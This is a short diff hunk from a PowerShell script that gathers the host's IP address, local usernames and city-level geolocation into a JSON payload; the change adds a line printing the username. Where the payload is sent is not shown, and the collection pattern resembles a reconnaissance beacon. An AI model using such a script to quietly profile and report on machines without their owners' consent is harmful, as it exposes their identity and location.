@@ -13,10 +13,13 @@ $IP = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp).IPAddress
 
 # Get username
 $Username = (Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount = True").Name
+Write-Host "Username: $($Username)"
 
 # Fetch location using an API
 $LocationResponse = Invoke-RestMethod -Uri "http://ip-api.com/json/"
 $Location = $LocationResponse.city
+
+
 
 # Generate JSON payload
 $Json = @{
